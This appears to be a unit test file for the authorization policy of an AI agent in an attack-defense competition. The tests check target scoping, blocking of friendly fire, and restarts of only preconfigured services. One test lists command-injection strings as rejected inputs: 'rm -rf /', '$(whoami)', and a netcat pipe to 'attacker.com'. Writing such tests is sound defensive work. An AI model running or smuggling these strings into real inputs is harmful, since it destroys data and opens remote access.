"""Unit tests for the SecurityPolicy authorization gate and service unit resolution."""
import unittest

from agent.actions.base import ActionContext
from agent.actions.defense_actions import RestartServiceAction
from agent.config import Config, ServiceConfig
from agent.gemini_client import Decision
from agent.security.policy import RiskLevel, SecurityPolicy


class TestSecurityPolicy(unittest.TestCase):
    def setUp(self):
        self.config = Config(
            gemini_api_key="mock_key",
            scoreboard_url="http://scoreboard.local",
            own_services=["10.0.1.5:80:web-service", "10.0.1.5:443:nginx-ssl"],
            target_hosts=["198.51.100.10", "198.51.100.20"],
            allowed_plugins=["test_plugin"],
            dry_run=True,
        )
        self.policy = SecurityPolicy(cfg=self.config)

    def test_defend_authorized_service(self):
        decision = Decision(
            action_type="defend",
            target="10.0.1.5:80",
            priority="high",
            reasoning="Service recovery",
        )
        auth = self.policy.authorize(decision)
        self.assertTrue(auth.allowed)
        self.assertEqual(auth.sanitized_target, "10.0.1.5:80")
        self.assertIsNotNone(auth.resolved_service)
        self.assertEqual(auth.resolved_service.systemd_unit, "web-service")

    def test_defend_competitor_target_rejected(self):
        # AI attempts to 'defend' a competitor host -> must be blocked
        decision = Decision(
            action_type="defend",
            target="198.51.100.10:80",
            priority="critical",
            reasoning="Attempting action on competitor host",
        )
        auth = self.policy.authorize(decision)
        self.assertFalse(auth.allowed)
        self.assertEqual(auth.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(auth.safe_decision.action_type, "hold")
        self.assertIn("TARGET_HOST", auth.reason)

    def test_defend_unconfigured_host_rejected(self):
        # AI attempts to defend unconfigured arbitrary host
        decision = Decision(
            action_type="defend",
            target="10.0.99.99:80",
            priority="high",
            reasoning="Unconfigured target",
        )
        auth = self.policy.authorize(decision)
        self.assertFalse(auth.allowed)
        self.assertEqual(auth.safe_decision.action_type, "hold")
        self.assertIn("not in configured OWN_SERVICES", auth.reason)

    def test_attack_authorized_target(self):
        decision = Decision(
            action_type="attack",
            target="198.51.100.10:8080",
            priority="normal",
            reasoning="Targeted exploit",
        )
        auth = self.policy.authorize(decision)
        self.assertTrue(auth.allowed)
        self.assertEqual(auth.sanitized_target, "198.51.100.10:8080")

    def test_attack_own_infrastructure_rejected(self):
        # AI attempts to attack own host -> safety violation
        decision = Decision(
            action_type="attack",
            target="10.0.1.5:80",
            priority="critical",
            reasoning="Accidental friendly fire",
        )
        auth = self.policy.authorize(decision)
        self.assertFalse(auth.allowed)
        self.assertEqual(auth.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(auth.safe_decision.action_type, "hold")
        self.assertIn("own infrastructure", auth.reason)

    def test_attack_unauthorized_host_rejected(self):
        decision = Decision(
            action_type="attack",
            target="8.8.8.8:53",
            priority="high",
            reasoning="Out of scope target",
        )
        auth = self.policy.authorize(decision)
        self.assertFalse(auth.allowed)
        self.assertEqual(auth.risk_level, RiskLevel.CRITICAL)
        self.assertIn("TARGET_HOSTS", auth.reason)

    def test_attack_without_port_rejected(self):
        decision = Decision(
            action_type="attack",
            target="198.51.100.10",
            priority="high",
            reasoning="Missing target port",
        )
        auth = self.policy.authorize(decision)
        self.assertFalse(auth.allowed)
        self.assertIn("valid target port", auth.reason)

    def test_recon_authorized_target_and_own_host(self):
        # Recon on competition target
        auth1 = self.policy.authorize(Decision("recon", "198.51.100.10", "low", "Scan target"))
        self.assertTrue(auth1.allowed)

        # Recon on own host
        auth2 = self.policy.authorize(Decision("recon", "10.0.1.5", "low", "Audit own host"))
        self.assertTrue(auth2.allowed)

        # Recon on out-of-scope host
        auth3 = self.policy.authorize(Decision("recon", "172.16.1.1", "low", "Out of scope"))
        self.assertFalse(auth3.allowed)

    def test_command_injection_targets_rejected(self):
        injection_targets = [
            "10.0.1.5:80; rm -rf /",
            "10.0.1.5`reboot`",
            "10.0.1.5$(whoami)",
            "10.0.1.5|nc attacker.com 4444",
            "10.0.1.5\nreboot",
            "&& touch /tmp/pwned",
        ]
        for bad_target in injection_targets:
            decision = Decision("defend", bad_target, "high", "Injection test")
            auth = self.policy.authorize(decision)
            self.assertFalse(auth.allowed, f"Failed to reject injection target: {bad_target}")
            self.assertEqual(auth.risk_level, RiskLevel.CRITICAL)
            self.assertEqual(auth.safe_decision.action_type, "hold")

    def test_invalid_port_numbers_rejected(self):
        bad_ports = ["10.0.1.5:0", "10.0.1.5:65536", "10.0.1.5:99999", "10.0.1.5:-5"]
        for target in bad_ports:
            decision = Decision("defend", target, "high", "Bad port")
            auth = self.policy.authorize(decision)
            self.assertFalse(auth.allowed, f"Failed to reject bad port target: {target}")

    def test_hold_always_allowed(self):
        decision = Decision("hold", "", "low", "Safe baseline")
        auth = self.policy.authorize(decision)
        self.assertTrue(auth.allowed)
        self.assertEqual(auth.safe_decision.action_type, "hold")

    def test_ai_cannot_supply_arbitrary_systemd_unit(self):
        """Verify RestartServiceAction strictly uses preconfigured systemd unit."""
        # Setup config where 10.0.1.5:80 has unit 'web-service', but port 8080 has no configured unit
        cfg = Config(
            gemini_api_key="mock",
            scoreboard_url="http://mock",
            own_services=["10.0.1.5:80:web-service", "10.0.1.5:8080"],
            dry_run=True,
        )

        class MockPatcher:
            def __init__(self):
                self.restarted_units = []

            def restart(self, service_name: str):
                self.restarted_units.append(service_name)
                from agent.defense.patcher import PatchResult
                return PatchResult(success=True, service=service_name, action="restart")

        class MockMonitor:
            def check_port(self, host: str, port: int):
                return True

        mock_patcher = MockPatcher()
        context = ActionContext(
            config=cfg,
            monitor=MockMonitor(),
            firewall=None,
            patcher=mock_patcher,
            recon=None,
            dispatcher=None,
        )

        action = RestartServiceAction()

        # 1. Configured unit execution
        rec1 = action.execute("10.0.1.5:80", context)
        self.assertTrue(rec1.success)
        self.assertIn("web-service", mock_patcher.restarted_units)

        # 2. Port without configured unit must refuse execution
        rec2 = action.execute("10.0.1.5:8080", context)
        self.assertFalse(rec2.success)
        self.assertIn("No preconfigured systemd unit found", rec2.failure_reason)


if __name__ == "__main__":
    unittest.main()
